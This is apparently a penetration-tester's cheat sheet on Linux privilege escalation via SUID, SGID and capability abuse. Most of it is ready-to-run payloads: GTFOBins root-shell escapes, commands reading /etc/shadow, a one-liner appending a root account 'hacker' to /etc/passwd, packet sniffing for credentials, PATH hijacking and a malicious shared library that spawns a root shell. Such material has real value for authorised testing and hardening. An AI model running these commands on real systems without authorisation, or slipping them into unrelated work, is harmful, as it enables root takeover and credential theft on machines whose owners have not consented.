# Linux – SUID, SGID & Capabilities Abuse

### SUID Binary Enumeration + GTFOBins Exploitation [added: 2026-04]
- **Tags:** #SUID #SetUID #GTFOBins #PrivEsc #Linux #LinPEAS #BinaryAbuse #FindPerm #SetBit
- **Trigger:** linpeas or manual enumeration reveals non-standard SUID binaries (find -perm -4000 output shows binaries like find, vim, python, bash, nmap, env, cp, or custom binaries owned by root)
- **Prereq:** Low-privilege shell on Linux host; SUID binary present that has a known GTFOBins escalation path
- **Yields:** Command execution as the SUID binary owner (typically root), often a full root shell
- **Opsec:** Low
- **Context:** SUID binaries run with the file owner's privileges regardless of who executes them. Many standard Linux utilities, when SUID root, can be trivially abused for privilege escalation. After finding SUID binaries, cross-reference each against GTFOBins for known shell escapes or file read/write primitives.
- **Payload/Method:**
```bash
# Enumerate all SUID binaries on the system
find / -perm -4000 -type f 2>/dev/null

# Common SUID abuse examples (if binary is SUID root):

# find — spawn shell via -exec
find . -exec /bin/bash -p \; -quit

# vim — drop to shell from within vim
vim -c ':!/bin/bash'

# python/python3 — spawn root shell
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# bash — if bash itself is SUID
bash -p

# nmap (older versions with interactive mode)
nmap --interactive
!sh

# env — execute shell inheriting SUID
env /bin/bash -p

# cp — overwrite /etc/passwd with modified version
cp /etc/passwd /tmp/passwd.bak
# Edit /tmp/passwd.bak to add root user, then:
cp /tmp/passwd.bak /etc/passwd

# Cross-reference any unknown binary:
# https://gtfobins.github.io/#+suid
```

### SGID Binary Abuse [added: 2026-04]
- **Tags:** #SGID #SetGID #GroupPriv #PrivEsc #Linux #GTFOBins #GroupAbuse #WritableFiles
- **Trigger:** Enumeration reveals SGID binaries (find -perm -2000) or current user belongs to a privileged group (shadow, disk, adm, docker, lxd) with group-writable sensitive files
- **Prereq:** Low-privilege shell; SGID binary or membership in a privileged group that owns sensitive files
- **Yields:** Read/write access to files owned by the SGID group (e.g., /etc/shadow via shadow group), potential escalation to root
- **Opsec:** Low
- **Context:** SGID binaries execute with the group owner's privileges. If a binary runs as the shadow group, it can read /etc/shadow. Additionally, check if the current user's group memberships grant write access to sensitive files like cron scripts, service configs, or log directories.
- **Payload/Method:**
```bash
# Enumerate all SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Check current user's group memberships
id
groups

# Find files writable by your groups
find / -group $(id -gn) -writable -type f 2>/dev/null

# If in 'shadow' group — read /etc/shadow directly
cat /etc/shadow

# If in 'disk' group — raw disk read with debugfs
debugfs /dev/sda1
cat /etc/shadow

# If in 'adm' group — read logs for credentials
grep -r "password\|passwd\|pass=" /var/log/ 2>/dev/null

# Find group-writable files owned by root or privileged groups
find / -type f -writable -not -user $(whoami) 2>/dev/null | head -50

# Cross-reference SGID binaries with GTFOBins:
# https://gtfobins.github.io/#+sgid
```

### Linux Capabilities Abuse [added: 2026-04]
- **Tags:** #Capabilities #cap_setuid #cap_dac_read_search #cap_net_raw #LinPEAS #PrivEsc #Linux #GetCap #PythonCap #PerlCap
- **Trigger:** linpeas or getcap reveals binaries with dangerous capabilities (cap_setuid, cap_dac_read_search, cap_dac_override, cap_net_raw, cap_sys_admin, cap_fowner)
- **Prereq:** Low-privilege shell; binary with exploitable Linux capability set (effective or permitted)
- **Yields:** Root shell (cap_setuid), arbitrary file read (cap_dac_read_search), network sniffing (cap_net_raw), or filesystem override (cap_dac_override)
- **Opsec:** Low
- **Context:** Linux capabilities split root's monolithic privilege into granular units. When binaries like python, perl, ruby, or tar have capabilities set, they can be abused without the binary being SUID. cap_setuid is the most dangerous — it allows the process to change its UID to 0.
- **Payload/Method:**
```bash
# Enumerate all capabilities recursively
getcap -r / 2>/dev/null

# --- cap_setuid (spawn root shell) ---

# Python with cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Perl with cap_setuid+ep
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'

# Ruby with cap_setuid+ep
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# --- cap_dac_read_search (read any file) ---

# Python with cap_dac_read_search+ep — read /etc/shadow
python3 -c 'f=open("/etc/shadow","r"); print(f.read())'

# tar with cap_dac_read_search+ep — archive then extract protected files
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz -C /tmp/

# --- cap_net_raw (sniff credentials on the wire) ---

# Python/tcpdump with cap_net_raw+ep
tcpdump -i eth0 -w /tmp/capture.pcap
python3 -c 'from scapy.all import *; sniff(iface="eth0", count=100, prn=lambda x: x.summary())'

# --- cap_dac_override (write any file) ---
# Python with cap_dac_override+ep — write to /etc/passwd
python3 -c 'f=open("/etc/passwd","a"); f.write("hacker:$(openssl passwd -1 pass123):0:0::/root:/bin/bash\n"); f.close()'
```

### Custom SUID Binary Exploitation [added: 2026-04]
- **Tags:** #CustomSUID #SharedLibrary #LibraryHijack #Strings #Ltrace #Strace #PrivEsc #Linux #RPATH #MissingSO #BinaryAnalysis
- **Trigger:** Non-standard/custom SUID binary found that is not in GTFOBins (likely compiled in-house); strings output shows relative command calls or references to shared libraries
- **Prereq:** Low-privilege shell; custom SUID root binary; ability to run strings/ltrace/strace on it (or read access to analyze it); writable directory in library search path or writable directory ahead of the binary's expected PATH
- **Yields:** Root shell via hijacked library or command execution
- **Opsec:** Med
- **Context:** Custom SUID binaries often call system commands without absolute paths or load shared libraries from writable locations. Analyze the binary with strings to find command names, ltrace to trace library calls, and strace to trace system calls. If the binary calls a command like "service" instead of "/usr/sbin/service", you can hijack it. If it loads a missing .so file, you can provide a malicious one.
- **Payload/Method:**
```bash
# Step 1: Identify the custom SUID binary
find / -perm -4000 -type f 2>/dev/null | grep -v '/usr/bin\|/usr/sbin\|/usr/lib\|/snap'

# Step 2: Analyze it
strings /path/to/suid_binary          # Look for command names, library paths
ltrace /path/to/suid_binary 2>&1      # Trace library calls
strace /path/to/suid_binary 2>&1      # Trace system calls — look for open() on missing .so files

# Step 3a: PATH hijack (if binary calls command without absolute path)
# Example: binary calls system("service apache2 restart")
echo '#!/bin/bash' > /tmp/service
echo 'bash -p' >> /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/path/to/suid_binary

# Step 3b: Shared library hijack (if binary tries to load missing .so)
# strace output shows: open("/home/user/lib/libcustom.so", ...) = -1 ENOENT
# Create malicious shared library:
cat > /tmp/exploit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /home/user/lib/libcustom.so /tmp/exploit.c
/path/to/suid_binary

# Step 3c: RPATH/RUNPATH abuse (check with readelf)
readelf -d /path/to/suid_binary | grep -i 'rpath\|runpath'
# If RPATH points to writable directory, place malicious .so there
```
